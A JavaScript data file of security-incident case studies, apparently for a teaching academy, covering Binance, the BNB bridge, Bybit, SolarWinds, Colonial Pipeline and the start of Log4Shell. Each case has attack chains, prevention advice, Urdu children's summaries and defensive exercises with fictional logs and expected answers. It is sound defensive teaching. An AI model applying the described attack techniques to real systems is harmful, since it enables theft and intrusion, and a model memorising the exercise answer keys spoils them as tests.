window.ACADEMY_CASES=[{id:"binance-2019-hot-wallet",name:"Binance BTC hot wallet theft",date:"2019-05-07",organization:"Binance",category:"crypto-exchange",timeline:[{date:"2019-05-07",event:"Binance says it discovered a large-scale security breach at 17:15:24 UTC; 7,000 BTC left its BTC hot wallet in one transaction.",status:"company_statement"},{date:"2019-05-07",event:"Withdrawals stopped right after the withdrawal triggered alarms; deposits and withdrawals suspended for a security review estimated at one week.",status:"company_statement"},{date:"2019-05-08",event:"CEO Changpeng Zhao holds a previously scheduled live AMA and asks users to reset API keys and 2FA.",status:"company_statement"},{date:"2019-05-19",event:"CZ publishes a recap: attackers controlled a number of user accounts and bypassed pre-withdrawal risk checks; post-withdrawal monitoring caught it.",status:"company_statement"}],what_happened:[{text:"Attackers obtained a large number of Binance users' API keys, 2FA codes and potentially other information, then used those accounts to request withdrawals.",status:"company_statement"},{text:"One transaction moved 7,000 BTC out of Binance's BTC hot wallet, which held about 2% of the exchange's BTC holdings; Binance said other wallets were unharmed.",status:"company_statement"},{text:"Binance said the withdrawal was structured to pass its existing security checks, using multiple seemingly independent accounts at an opportune time.",status:"company_statement"}],initial_access:{text:"Compromise of user accounts (API keys, 2FA codes) through 'phishing, viruses and other attacks'; Binance said it was still concluding all methods used. Exact technique was never fully published.",status:"company_statement"},failure:[{text:"Pre-withdrawal risk checks did not block a large, coordinated withdrawal made through many compromised accounts.",status:"company_statement"},{text:"Stolen API keys plus 2FA codes were enough to act on user accounts.",status:"company_statement"}],attack_chain:[{step:1,stage:"Credential theft",text:"Phishing, malware and other techniques used to collect user API keys and 2FA codes.",status:"company_statement"},{step:2,stage:"Account takeover",text:"Attackers gained control of a number of user accounts.",status:"company_statement"},{step:3,stage:"Patience / staging",text:"Attackers waited and coordinated actions across seemingly independent accounts.",status:"company_statement"},{step:4,stage:"Withdrawal",text:"A single withdrawal transaction of 7,000 BTC passed existing checks.",status:"company_statement"}],impact:[{text:"7,000 BTC lost from the hot wallet (Binance put it at about US$40 million at the time).",status:"company_statement"},{text:"Binance said its SAFU fund covered the loss in full and no user funds were affected.",status:"company_statement"},{text:"Deposits and withdrawals were suspended for roughly a week while the system was reviewed.",status:"company_statement"}],detection_investigation:[{text:"The executed withdrawal triggered alarms in Binance's post-withdrawal monitoring; all withdrawals were then stopped.",status:"company_statement"},{text:"Analytics firms (e.g., PeckShield, Whale Alert) helped trace funds; other exchanges offered to block deposits from attacker addresses.",status:"company_statement"}],response_recovery:[{text:"Full security review of systems and data; withdrawals restored after about a week.",status:"company_statement"},{text:"Users urged to change API keys and reset/re-enable 2FA.",status:"company_statement"},{text:"Binance announced significant changes to API, 2FA and withdrawal validation (the areas exploited), improved risk management, user-behaviour analysis and KYC, and planned hardware security key (YubiKey) support.",status:"company_statement"},{text:"Binance said it was working with many exchanges and analytics firms to track and freeze the stolen funds.",status:"company_statement"}],prevention:[{text:"Use phishing-resistant MFA (hardware security keys) rather than codes that can be phished or stolen.",basis:"Binance Security Incident Update #2 (company_statement)"},{text:"Restrict API keys: IP allow-lists, no withdrawal permission unless needed, short lifetimes.",basis:"General defensive practice (editorial)"},{text:"Apply velocity/anomaly rules across accounts, not just per account, before large hot-wallet withdrawals.",basis:"Lesson from company statement (editorial)"},{text:"Keep most funds in cold storage; keep hot wallets small.",basis:"Company statement noted hot wallet held ~2% of BTC (editorial lesson)"}],lessons:["Many small account compromises can add up to one big theft.","Monitoring after a transaction is good, but checks before a transaction matter more.","Clear, fast communication with users helped Binance keep trust."],defensive_exercise:{title:"Spot the coordinated withdrawal",scenario:"You are a junior analyst at the fictional exchange 'CoinNest'. Below is a FICTIONAL withdrawal log. Some accounts may have been taken over.",sample_data:["2030-01-10T03:01:12Z acct=u1001 action=api_key_used ip=203.0.113.10 country=XX","2030-01-10T03:01:40Z acct=u1002 action=api_key_used ip=203.0.113.10 country=XX","2030-01-10T03:02:05Z acct=u1003 action=api_key_used ip=203.0.113.11 country=XX","2030-01-10T03:05:00Z acct=u1001 action=withdraw_request asset=BTC amount=0.9 dest=bc1-FAKE-DEST-A","2030-01-10T03:05:02Z acct=u1002 action=withdraw_request asset=BTC amount=0.9 dest=bc1-FAKE-DEST-A","2030-01-10T03:05:03Z acct=u1003 action=withdraw_request asset=BTC amount=0.9 dest=bc1-FAKE-DEST-A","2030-01-10T09:14:22Z acct=u2040 action=withdraw_request asset=BTC amount=0.05 dest=bc1-FAKE-DEST-Z ip=198.51.100.7 country=YY"],tasks:["Which accounts share the same IP range and the same destination address?","Why would three different users send the same amount to the same address within seconds?","What rule would you add BEFORE withdrawals are approved?","Who should be told, and what should users be asked to do?"],expected_findings:["u1001, u1002 and u1003 used API keys from 203.0.113.10–11 and all withdrew 0.9 BTC to bc1-FAKE-DEST-A within 3 seconds: likely coordinated takeover.","u2040 looks normal (different IP, small amount, different time).","A cross-account rule: hold withdrawals when several accounts send to one new address in a short window.","Freeze affected accounts, ask users to rotate API keys and enable security keys, inform the security team."]},kid_summary_urdu:"۲۰۱۹ میں کچھ چوروں نے دھوکے والے پیغامات کے ذریعے بہت سے لوگوں کے خفیہ کوڈ حاصل کر لیے اور ایک بڑی کرپٹو کمپنی سے بٹ کوائن لے گئے۔ کمپنی نے فوراً رقم نکالنے کا نظام روک دیا اور اپنے حفاظتی فنڈ سے سب کا نقصان پورا کیا۔ اس سے ہم سیکھتے ہیں کہ اپنا پاس ورڈ اور کوڈ کبھی کسی کو نہ بتائیں۔",unresolved:["Exact methods used to collect API keys and 2FA codes were not fully published.","Who carried out the theft has not been publicly confirmed by authorities in the sources reviewed."],references:[{title:"Binance Security Breach Update (2019-05-07)",url:"https://www.binance.com/en/support/announcement/detail/360028031711",publisher:"Binance"},{title:"Security Incident Recap (2019-05-19)",url:"https://www.binance.com/en/blog/all/336904059293999104",publisher:"Binance"},{title:"Binance Security Incident Update #2 (2019-05-10)",url:"https://www.binance.com/en/blog/all/333497959022997504",publisher:"Binance"}]},{id:"bnb-chain-bsc-token-hub-2022",name:"BNB Chain BSC Token Hub bridge exploit",date:"2022-10-06",organization:"BNB Chain (BSC Token Hub, linked to Binance)",category:"crypto-exchange",timeline:[{date:"2022-10-06",event:"An attacker exploits the BSC Token Hub cross-chain bridge between BNB Beacon Chain (BEP2) and BNB Smart Chain (BEP20); 2 million BNB are withdrawn.",status:"company_statement"},{date:"2022-10-06",event:"BNB Chain contacts validators one by one to pause BNB Smart Chain (26 active validators, 44 total, in different time zones).",status:"company_statement"},{date:"2022-10-07",event:"BNB Chain publishes an apology and 'Ecosystem Update' explaining a forged low-level proof in a common library.",status:"company_statement"},{date:"2022-10-08",event:"A fix is proposed (bsc PR #1121) adding proof verifiers to block the vulnerable IAVL range-proof path.",status:"confirmed"},{date:"2022-10-11",event:"The fix is merged and prepared as release v1.1.16 with a hard fork height.",status:"confirmed"},{date:"2022-11-08",event:"BNB Chain's monthly tech update proposes BEP171: ICS23 proof verification, time locks on large transfers, auto-pause on forged proofs, validator emergency pause.",status:"company_statement"}],what_happened:[{text:"The bridge trusted cryptographic 'proofs' that a message really came from the other chain. The attacker forged such a proof, and the bridge released 2 million BNB that had not been legitimately sent.",status:"company_statement"},{text:"The root cause was a bug in IAVL range-proof verification: when a path node had both left and right fields, the hash ignored the right field, so arbitrary key-value pairs could be 'proven'.",status:"confirmed"},{text:"BNB Chain stated the blockchain itself was not compromised and that the issue was limited to the bridge.",status:"company_statement"}],initial_access:{text:"No break-in to company systems: the attacker submitted crafted bridge transactions carrying forged IAVL Merkle proofs that the on-chain verifier accepted.",status:"confirmed"},failure:[{text:"Proof-verification code (from a shared library) accepted mathematically incomplete proofs.",status:"confirmed"},{text:"No automatic limits or time locks stopped a very large cross-chain transfer; BNB Chain later proposed such controls in BEP171.",status:"company_statement"}],attack_chain:[{step:1,stage:"Study",text:"Attacker needed detailed knowledge of how the bridge verified proofs from the Beacon Chain (inferred from the nature of the bug).",status:"unresolved"},{step:2,stage:"Forge",text:"Crafted a proof that exploited the range-proof hashing flaw.",status:"confirmed"},{step:3,stage:"Mint/withdraw",text:"Bridge accepted the proof and released 2 million BNB.",status:"company_statement"},{step:4,stage:"Move funds",text:"Attacker attempted to move funds off the chain before validators paused it (details of amounts moved vary by source).",status:"unresolved"}],impact:[{text:"2 million BNB withdrawn from the bridge; BNB Chain said the vast majority of funds remained under control after the pause.",status:"company_statement"},{text:"BNB Smart Chain was temporarily halted by validators, interrupting all users.",status:"company_statement"}],detection_investigation:[{text:"Community, security experts and validators helped identify and contain the incident.",status:"company_statement"},{text:"Developers traced the bug to the IAVL proof logic and published a technical explanation in the patch.",status:"confirmed"}],response_recovery:[{text:"Validators paused the chain; an emergency patch (v1.1.16) blocked absence proofs and multi-leaf value proofs.",status:"confirmed"},{text:"On-chain governance votes planned on freezing funds, using auto-burn, a $1M-per-bug whitehat program and a bounty for catching the attacker.",status:"company_statement"}],prevention:[{text:"Audit cryptographic verification code, including third-party libraries, with tests for malformed proofs.",basis:"Lesson from GitHub PR #1121 (editorial)"},{text:"Add rate limits / time locks for large cross-chain transfers and automatic pause on forged-proof detection.",basis:"BEP171 proposal in BNB Chain Oct 2022 technology update (company_statement)"},{text:"Prepare an emergency-stop runbook that works across many validators and time zones.",basis:"Company statement on slow validator coordination (editorial)"}],lessons:["A bridge is only as safe as its proof checker.","Code you borrow from a library is still your responsibility.","Having a fast 'pause button' limits damage."],defensive_exercise:{title:"Guarding a toy bridge",scenario:"The fictional 'RiverBridge' moves tokens between two practice chains. Below is a FICTIONAL bridge monitor log.",sample_data:["2030-02-01T10:00:00Z relay msg=0x01 amount=50 proof_ok=true src_height=1200","2030-02-01T10:03:00Z relay msg=0x02 amount=75 proof_ok=true src_height=1201","2030-02-01T10:05:10Z relay msg=0x03 amount=1000000 proof_ok=true src_height=110217401 leaves_in_proof=2","2030-02-01T10:05:40Z relay msg=0x04 amount=1000000 proof_ok=true src_height=110217401 leaves_in_proof=2","2030-02-01T10:06:00Z daily_average_amount=120"],tasks:["Which messages look unusual compared with the daily average?","Two messages reuse the same source height and have more than one leaf in the proof. Why might that matter?","Design two automatic safety rules for the bridge."],expected_findings:["msg 0x03 and 0x04 are ~8,000x the daily average and arrive 30 seconds apart.","Reused heights and multi-leaf proofs match the type of proof the real fix later blocked; 'proof_ok=true' alone should not be trusted.","Example rules: hold transfers above a size threshold for review/time lock; auto-pause the bridge if proofs with unexpected structure appear."]},kid_summary_urdu:"۲۰۲۲ میں ایک ڈیجیٹل 'پل' کے کوڈ میں چھوٹی سی غلطی تھی جو دو بلاک چینز کو آپس میں جوڑتا تھا۔ ایک شخص نے نقلی ثبوت دکھا کر ٹوکن نکال لیے، لیکن ٹیم نے جلدی سے سسٹم روک دیا اور غلطی ٹھیک کر دی۔ اس سے سیکھتے ہیں کہ کوڈ کو بار بار جانچنا بہت ضروری ہے۔",unresolved:["The US-dollar value the attacker managed to move off-chain was reported differently by different outlets; no primary figure was opened for this library.","The attacker has not been publicly identified in the sources reviewed.","BNB Chain promised a full post-mortem; it was not located/opened for this library."],references:[{title:"BNB Chain Ecosystem Update (2022-10-07)",url:"https://www.bnbchain.org/en/blog/bnb-chain-ecosystem-update",publisher:"BNB Chain"},{title:"Technology Update of BNB Chain in Oct 2022",url:"https://www.bnbchain.org/en/blog/technology-update-of-bnb-chain-in-october-2022",publisher:"BNB Chain"},{title:"vm: add two proof verifier to fix the vulnerability in range proof (PR #1121)",url:"https://github.com/bnb-chain/bsc/pull/1121",publisher:"GitHub / bnb-chain"}]},{id:"bybit-2025",name:"Bybit Ethereum cold-wallet theft via Safe{Wallet} supply-chain compromise",date:"2025-02-21",organization:"Bybit (with Safe{Wallet} as affected supplier)",category:"crypto-exchange",secondary_categories:["supply-chain","cloud"],timeline:[{date:"2025-02-04",event:"A Safe{Wallet} developer's macOS workstation is compromised after a Docker project (posing as a stock-investing simulator) runs from the Downloads folder.",status:"researcher_finding"},{date:"2025-02-05",event:"The attacker begins using the developer's AWS session; a failed attempt to register their own MFA device is seen.",status:"researcher_finding"},{date:"2025-02-19",event:"A JavaScript file served from Safe{Wallet}'s AWS S3 bucket is modified with code that activates only for Bybit's wallet.",status:"researcher_finding"},{date:"2025-02-21",event:"Bybit signers approve what appears to be a normal transaction; the transaction had been manipulated, and about US$1.5B in assets is drained. Malicious JavaScript is removed about two minutes later.",status:"researcher_finding"},{date:"2025-02-26",event:"FBI attributes the theft to North Korea ('TraderTraitor') and publishes addresses to block.",status:"confirmed"},{date:"2025-02-28",event:"Safe Ecosystem Foundation says a compromised developer machine led to a disguised malicious transaction; contracts and frontend source had no vulnerability.",status:"company_statement"}],what_happened:[{text:"North Korean actors stole approximately US$1.5 billion in virtual assets from Bybit on or about 21 February 2025.",status:"confirmed"},{text:"Attackers did not break Bybit's signing devices directly. They tampered with the Safe{Wallet} web interface so signers saw a normal-looking transaction while approving a malicious one.",status:"researcher_finding"},{text:"Safe said no vulnerabilities were found in Safe smart contracts or the frontend source code; the problem was a compromised developer machine.",status:"company_statement"}],initial_access:{text:"Compromise of a Safe{Wallet} developer workstation via a malicious Docker project, followed by hijacking of active AWS session tokens to modify JavaScript hosted on S3.",status:"researcher_finding"},failure:[{text:"A single developer's session could change production JavaScript used to approve high-value transactions.",status:"researcher_finding"},{text:"Signers relied on what the web interface displayed ('blind signing') rather than independently verifying the raw transaction.",status:"researcher_finding"}],attack_chain:[{step:1,stage:"Social engineering / malware",text:"Developer runs a malicious Docker project; malware beacons to attacker infrastructure.",status:"researcher_finding"},{step:2,stage:"Cloud access",text:"Attacker reuses the developer's active AWS session tokens (MFA re-auth was required only every 12 hours).",status:"researcher_finding"},{step:3,stage:"Supply-chain tampering",text:"Malicious code inserted into Safe{Wallet} JavaScript on S3, targeted at Bybit only.",status:"researcher_finding"},{step:4,stage:"Deceptive signing",text:"Bybit signers approve a manipulated transaction that the tampered interface made look legitimate.",status:"researcher_finding"},{step:5,stage:"Laundering",text:"Assets converted (some to BTC) and dispersed across thousands of addresses on many chains.",status:"confirmed"}],impact:[{text:"About US$1.5 billion stolen, described by the FBI as attributable to North Korea.",status:"confirmed"},{text:"Safe{Wallet} paused, rebuilt infrastructure and restored service in phases.",status:"company_statement"}],detection_investigation:[{text:"Investigators found traces of the malicious JavaScript in signers' browser (Chrome) cache files.",status:"researcher_finding"},{text:"Sygnia investigated for Bybit; Mandiant produced a preliminary report for Safe.",status:"researcher_finding"},{text:"FBI published Ethereum addresses and asked RPC node operators, exchanges and bridges to block related transactions.",status:"confirmed"}],response_recovery:[{text:"Safe rebuilt infrastructure, rotated all credentials and restored Ethereum mainnet service in phases.",status:"company_statement"},{text:"Safe committed to an industry initiative on transaction verifiability and promised a post-mortem.",status:"company_statement"}],prevention:[{text:"Verify transactions independently of the web UI (hardware wallet screens, raw calldata decoding, second tool).",basis:"Safe commitment to transaction verifiability (company_statement)"},{text:"Protect build/deploy paths: require reviews and integrity checks (e.g., subresource integrity, signed releases) for production front-end code.",basis:"Lesson from Sygnia findings (editorial)"},{text:"Shorten cloud session lifetimes and alert on use of developer sessions from VPN/unusual hosts.",basis:"Lesson from Sygnia findings (editorial)"},{text:"Treat unsolicited coding projects as untrusted; run them only in isolated environments.",basis:"Lesson from Sygnia findings (editorial)"}],lessons:["Attackers may target the tools you trust, not you directly.","What a screen shows is not always what you are signing.","One developer laptop can be a door into many customers."],defensive_exercise:{title:"Does the screen match the transaction?",scenario:"At the fictional company 'VaultKids', two approvers must sign transfers. You receive the FICTIONAL record below from the web app and from an independent decoder.",sample_data:["web_ui_display: action=transfer to=0xFAKE...CAFE amount=0 token=ETH note='routine check'","independent_decoder: function=delegatecall target=0xFAKE...BAD1 data=changeMasterCopy(0xFAKE...BAD2)","s3_access_log: 2030-03-01T08:59:12Z PUT /static/app-bundle.js user=dev-session-77 src_ip=192.0.2.44 ua=unusual","deploy_pipeline_log: 2030-03-01 no build job recorded"],tasks:["Compare the web UI display with the independent decoder. Do they agree?","What does the S3 log suggest about how the web app changed?","Should the approvers sign? What should they do instead?"],expected_findings:["They disagree: the UI shows a harmless transfer, the decoder shows a delegatecall that changes the wallet's master logic.","app-bundle.js was replaced directly by a developer session from an unusual IP with no matching build job: possible tampering.","Do not sign; escalate to security, freeze signing, compare file hashes with the last approved release."]},kid_summary_urdu:"۲۰۲۵ میں کچھ ہیکرز نے ایک ویب سائٹ کے کوڈ میں چھپ کر تبدیلی کی جسے ایک کرپٹو ایکسچینج استعمال کرتا تھا۔ اسکرین پر سب کچھ عام نظر آیا مگر اصل میں ایک غلط لین دین منظور ہو گیا۔ اس سے سیکھتے ہیں کہ کسی بھی اہم کام کو دو مختلف طریقوں سے جانچنا اچھی عادت ہے۔",unresolved:["Safe promised a full post-mortem; its final details were not reviewed for this library.","How much of the stolen value has been frozen or recovered is not established in the opened sources.","Exact human interaction that led the developer to run the Docker project is not fully public."],references:[{title:"North Korea Responsible for $1.5 Billion Bybit Hack (I-022625-PSA)",url:"https://www.ic3.gov/PSA/2025/PSA250226",publisher:"FBI IC3"},{title:"Safe Ecosystem Foundation Statement",url:"https://safefoundation.org/blog/safe-ecosystem-foundation-statement",publisher:"Safe Ecosystem Foundation"},{title:"Sygnia investigation: Bybit hack",url:"https://www.sygnia.co/blog/sygnia-investigation-bybit-hack/",publisher:"Sygnia"}]},{id:"solarwinds-orion-2020",name:"SolarWinds Orion SUNBURST supply-chain compromise",date:"2020-12-13",organization:"SolarWinds (Orion customers including US government agencies)",category:"supply-chain",timeline:[{date:"2020-03 to 2020-05",event:"Trojanized, digitally signed Orion updates are distributed; a backdoored DLL was signed on 2020-03-24.",status:"researcher_finding"},{date:"2020 (spring)",event:"Campaign activity observed as early as spring 2020.",status:"researcher_finding"},{date:"2020-12-12",event:"FireEye/Mandiant publishes analysis of the SUNBURST backdoor and the actor UNC2452.",status:"researcher_finding"},{date:"2020-12-13",event:"CISA issues Emergency Directive 21-01 ordering federal agencies to disconnect or power down affected Orion products.",status:"confirmed"},{date:"2021-04-15",event:"The US government attributes the campaign to Russia's Foreign Intelligence Service (SVR) (as noted in CISA ED 21-01 updates).",status:"confirmed"}],what_happened:[{text:"Attackers inserted a backdoor (SUNBURST) into SolarWinds.Orion.Core.BusinessLayer.dll, which was shipped inside normal, signed Orion software updates.",status:"researcher_finding"},{text:"CISA said the adversary had long-term covert access to SolarWinds' build process; affected versions were Orion 2019.4 HF5 through 2020.2.1 HF1.",status:"confirmed"},{text:"On selected victims, attackers used the backdoor to deploy further tools (TEARDROP memory-only dropper, Cobalt Strike BEACON) and move to other systems.",status:"researcher_finding"}],initial_access:{text:"Compromise of the vendor's software build environment, causing customers to install a backdoor through trusted updates. How the attackers first entered SolarWinds' own network is not established in the sources opened.",status:"confirmed"},failure:[{text:"Build pipeline integrity was not protected well enough to detect injected code before signing.",status:"confirmed"},{text:"Customers trusted signed vendor updates, so malicious code ran with the high privileges Orion needs for network monitoring.",status:"researcher_finding"}],attack_chain:[{step:1,stage:"Supply-chain compromise",text:"Malicious code added to Orion during the build and signed with the vendor's certificate.",status:"confirmed"},{step:2,stage:"Dormancy",text:"Backdoor stayed quiet for up to two weeks after installation and checked for security tools.",status:"researcher_finding"},{step:3,stage:"Command and control",text:"Backdoor contacted subdomains of avsvmcloud[.]com; DNS replies (CNAMEs) pointed selected victims to further servers, disguised as the 'Orion Improvement Program'.",status:"researcher_finding"},{step:4,stage:"Hands-on follow-up",text:"Memory-only TEARDROP dropper loaded Cobalt Strike BEACON; attackers used hostnames and IPs that blended into victim environments.",status:"researcher_finding"},{step:5,stage:"Lateral movement and data access",text:"Valid credentials and remote access used to reach other systems.",status:"researcher_finding"}],impact:[{text:"Many organisations installed the trojanized update; attackers chose a smaller set of high-value targets for follow-on activity, including US federal agencies.",status:"researcher_finding"},{text:"Federal civilian agencies were ordered to disconnect affected Orion products.",status:"confirmed"}],detection_investigation:[{text:"FireEye/Mandiant found the campaign while investigating its own intrusion and published indicators and detection advice.",status:"researcher_finding"},{text:"Suggested detection clues included 'impossible travel' logins and one system logging into many others ('one-to-many' logons).",status:"researcher_finding"}],response_recovery:[{text:"CISA ED 21-01 required agencies to disconnect or power down affected Orion products, and later allowed upgrade to Orion 2020.2.1 HF2 under conditions.",status:"confirmed"},{text:"Indicators such as avsvmcloud[.]com were shared publicly so defenders could hunt.",status:"confirmed"}],prevention:[{text:"Protect build systems: separate, monitored build environments; reproducible builds; compare build outputs with source.",basis:"Lesson from CISA ED 21-01 statement on build-process access (editorial)"},{text:"Limit what monitoring tools can reach on the network and the internet (egress filtering).",basis:"Lesson from Mandiant C2 analysis (editorial)"},{text:"Watch DNS and authentication logs for unusual patterns such as impossible travel.",basis:"Mandiant detection guidance (researcher_finding)"}],lessons:["Even trusted, signed updates can be tampered with.","Quiet attackers can hide for months; good logs help find them.","Supply-chain attacks can reach thousands of organisations at once."],defensive_exercise:{title:"The update that phoned home",scenario:"At the fictional school district 'BlueHill', the network-monitoring server received an update last month. You have FICTIONAL DNS logs.",sample_data:["2030-04-01T02:10:00Z host=netmon01 query=updates.fake-vendor.example type=A","2030-04-14T02:11:03Z host=netmon01 query=a1b2c3d4e5.appsync-api.fake-cdn.example type=A","2030-04-14T02:11:04Z host=netmon01 answer=CNAME next-hop.fake-cdn.example","2030-04-14T02:20:00Z host=netmon01 login_to=fileserver01 user=svc_netmon","2030-04-14T02:21:00Z host=netmon01 login_to=fileserver02 user=svc_netmon","2030-04-14T02:22:00Z host=netmon01 login_to=hr-db01 user=svc_netmon"],tasks:["When did netmon01 start contacting a new, random-looking domain compared with the update date?","What does the CNAME reply suggest?","Why is one monitoring server logging into many servers in minutes a concern?","List three containment steps."],expected_findings:["About two weeks after the update, netmon01 queried a random-looking subdomain: matches a 'dormant then beacon' pattern.","CNAME redirects the server to another host: possible command-and-control hand-off.","One-to-many logons by a service account are unusual and suggest lateral movement.","Isolate netmon01, block the domains, reset the service account, check the vendor update hash, report to authorities/vendor."]},kid_summary_urdu:"۲۰۲۰ میں کچھ ہیکرز نے ایک مشہور سافٹ ویئر کی اپ ڈیٹ میں چھپا ہوا کوڈ ڈال دیا، اور بہت سے دفاتر نے اسے بھروسے سے انسٹال کر لیا۔ سیکیورٹی ماہرین نے یہ مسئلہ ڈھونڈ نکالا اور سب کو اسے بند کرنے کا طریقہ بتایا۔ اس سے سیکھتے ہیں کہ بھروسہ مند چیزوں کو بھی دھیان سے جانچنا چاہیے۔",unresolved:["Exactly how the attackers first got into SolarWinds' corporate network is not stated in the sources opened.","The full list and number of organisations where follow-on activity occurred is not established here."],references:[{title:"ED 21-01: Mitigate SolarWinds Orion Code Compromise",url:"https://www.cisa.gov/news-events/directives/ed-21-01-mitigate-solarwinds-orion-code-compromise",publisher:"CISA"},{title:"Highly Evasive Attacker Leverages SolarWinds Supply Chain to Compromise Multiple Global Victims With SUNBURST Backdoor",url:"https://cloud.google.com/blog/topics/threat-intelligence/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor",publisher:"Mandiant / Google Cloud"}]},{id:"colonial-pipeline-2021",name:"Colonial Pipeline ransomware attack",date:"2021-05-07",organization:"Colonial Pipeline Company",category:"critical-infrastructure",secondary_categories:["ransomware","identity"],timeline:[{date:"2021-04-29",event:"Earliest evidence of compromise: attacker logs into a VPN appliance using a legacy VPN profile and an employee's username and password.",status:"researcher_finding"},{date:"2021-05-07 ~05:00 EDT",event:"An employee finds a ransom note on a system in the IT network.",status:"company_statement"},{date:"2021-05-07 05:55-06:10 EDT",event:"Shutdown begins; all 5,500 miles of pipeline confirmed shut down within about 15 minutes.",status:"company_statement"},{date:"2021-05-07",event:"Colonial contacts the FBI and holds a call with FBI and CISA; Mandiant engaged the same morning.",status:"company_statement"},{date:"2021-05-07/08",event:"Ransom paid; DOJ says about 75 bitcoin was paid on or about May 8.",status:"confirmed"},{date:"2021-05-12 (evening)",event:"Colonial begins returning all pipelines to service.",status:"company_statement"},{date:"2021-05-13",event:"DarkSide operators announce they are closing their service, citing law-enforcement pressure.",status:"researcher_finding"},{date:"2021-06-07",event:"DOJ announces seizure of 63.7 bitcoin (about US$2.3M) of the ransom.",status:"confirmed"}],what_happened:[{text:"Criminals using DarkSide ransomware encrypted Colonial's IT systems and demanded payment.",status:"company_statement"},{text:"Colonial shut down the whole pipeline as a precaution to stop the malware possibly spreading to the operational technology (OT) network that controls pipeline operations.",status:"company_statement"},{text:"The pipeline carries nearly half of the fuel consumed on the US East Coast, so the shutdown led to panic buying and shortages.",status:"company_statement"}],initial_access:{text:"Login to a VPN appliance using a legacy VPN profile that did not require a one-time passcode, with an employee's valid username and password. How the password was obtained was still being investigated.",status:"researcher_finding"},failure:[{text:"A legacy VPN profile 'not intended to be in use' was still active.",status:"company_statement"},{text:"That profile allowed single-factor (password-only) access.",status:"researcher_finding"}],attack_chain:[{step:1,stage:"Valid account",text:"Attacker logs in through a legacy VPN profile with a stolen username/password, no MFA.",status:"researcher_finding"},{step:2,stage:"Ransomware deployment",text:"DarkSide ransomware encrypts IT systems; ransom note left.",status:"company_statement"},{step:3,stage:"Extortion",text:"Payment demanded for a decryption key.",status:"company_statement"}],impact:[{text:"Pipeline operations halted for several days; fuel shortages and panic buying on the East Coast.",status:"company_statement"},{text:"About 75 bitcoin ransom paid; 63.7 bitcoin later seized by the US government.",status:"confirmed"}],detection_investigation:[{text:"Detected when an employee saw the ransom note in the IT network.",status:"company_statement"},{text:"Mandiant investigated and found the earliest evidence on April 29, 2021.",status:"researcher_finding"},{text:"DOJ later seized 63.7 bitcoin of the ransom payment.",status:"confirmed"}],response_recovery:[{text:"Stop-work order, controlled shutdown, manual operations of some lines within hours, scanning of systems, increased physical surveillance during restart.",status:"company_statement"},{text:"Legacy VPN profile disabled; additional protections added; Dragos and Black Hills Information Security engaged.",status:"company_statement"}],prevention:[{text:"Remove unused accounts and VPN profiles; regularly review remote-access configuration.",basis:"Lesson from company and Mandiant testimony (editorial)"},{text:"Require MFA for all remote access.",basis:"Lesson from Mandiant testimony; CISA MFA guidance (editorial)"},{text:"Segment IT from OT and practise incident-response plans, including safe shutdown and restart.",basis:"Mandiant testimony on IT/OT segmentation (researcher_finding)"},{text:"Maintain offline, tested backups.",basis:"CISA general guidance cited in AA23-320A (confirmed)"}],lessons:["One forgotten account can be enough for attackers.","Strong passwords help, but a second factor helps much more.","Being ready to shut down safely protects people."],defensive_exercise:{title:"The forgotten VPN door",scenario:"You manage remote access for the fictional water company 'ClearFlow'. Review this FICTIONAL VPN account export and login log.",sample_data:["vpn_profile=staff-2030   mfa=required  last_used=2030-05-01","vpn_profile=legacy-2024  mfa=none      last_used=2030-04-29 (should be disabled)","2030-04-29T22:14:00Z vpn_login profile=legacy-2024 user=j.doe src_ip=198.51.100.23 result=success","2030-04-29T22:30:00Z j.doe usual_location=office usual_hours=08:00-17:00","2030-05-02T04:50:00Z alert file_rename_spike host=it-fs02 extension=.locked"],tasks:["Which VPN profile is risky and why?","Why is the 22:14 login suspicious?","Connect the login to the later alert. What may have happened?","What three fixes would you make today?"],expected_findings:["legacy-2024 has no MFA and should not be in use.","Login is outside j.doe's normal hours and from an unfamiliar IP.","Likely the attacker used j.doe's password on the legacy profile, then deployed ransomware (mass renames to .locked).","Disable legacy-2024, enforce MFA on all profiles, reset j.doe's password and review IT/OT segmentation."]},kid_summary_urdu:"۲۰۲۱ میں امریکہ کی ایک بڑی تیل پائپ لائن کے کمپیوٹرز پر تالا لگانے والا وائرس آ گیا، کیونکہ ایک پرانا راستہ صرف پاس ورڈ سے کھل جاتا تھا۔ کمپنی نے حفاظت کے لیے پائپ لائن کچھ دن کے لیے بند کی اور پھر محفوظ طریقے سے دوبارہ چلائی۔ اس سے سیکھتے ہیں کہ پاس ورڈ کے ساتھ دوسرا حفاظتی قدم بھی لگانا چاہیے۔",unresolved:["How the attacker obtained the employee's VPN password was not determined in the opened testimony.","Whether ransomware reached the OT network: Colonial said it shut down partly because it did not yet know; final determination not in opened sources."],references:[{title:"Testimony of Joseph Blount, CEO, Colonial Pipeline (Senate HSGAC, 2021-06-08)",url:"https://www.hsgac.senate.gov/wp-content/uploads/imo/media/doc/Testimony-Blount-2021-06-08.pdf",publisher:"US Senate Committee on Homeland Security & Governmental Affairs"},{title:"Prepared Statement of Charles Carmakal, FireEye-Mandiant (House Homeland Security, 2021-06-09)",url:"https://www.congress.gov/117/meeting/house/112689/witnesses/HHRG-117-HM00-Wstate-CarmakalC-20210609.pdf",publisher:"US Congress"},{title:"Department of Justice Seizes $2.3 Million in Cryptocurrency Paid to the Ransomware Extortionists Darkside",url:"https://www.justice.gov/opa/pr/department-justice-seizes-23-million-cryptocurrency-paid-ransomware-extortionists-darkside",publisher:"US Department of Justice"}]},{id:"log4shell-cve-2021-44228",name:"Log4Shell (CVE-2021-44228) in Apache Log4j 2",date:"2021-12-10",organization:"Apache Software Foundation (Log4j) and thousands of organisations using it",category:"supply-chain",secondary_categories:["web-app"],timeline:[{date:"2021-12-10",event:"CVE-2021-44228 published in NVD and added to CISA's Known Exploited Vulnerabilities catalog; CVSS 10.0.",status:"confirmed"},{date:"2021-12 (mid)",event:"Apache releases 2.15.0 (JNDI disabled by default), then 2.16.0 (JNDI lookup removed) after an incomplete-fix issue (CVE-2021-45046).",status:"confirmed"},{date:"2021-12-17",event:"CISA issues Emergency Directive 22-02 requiring federal agencies to mitigate Log4j.",status:"confirmed"},{date:"2021-12-28",event:"CISA urges upgrading to Log4j 2.17.1 (Java 8), 2.12.4 (Java 7) or 2.3.2 (Java 6).",status:"confirmed"},{date:"2022-04-08",event:"CISA updates guidance: plan for long-term vulnerability management; patching preferred over workarounds.",status:"confirmed"}],what_happened:[{text:"Log4j 2, a very widely used Java logging library, would perform 'lookups' inside logged text. Text such 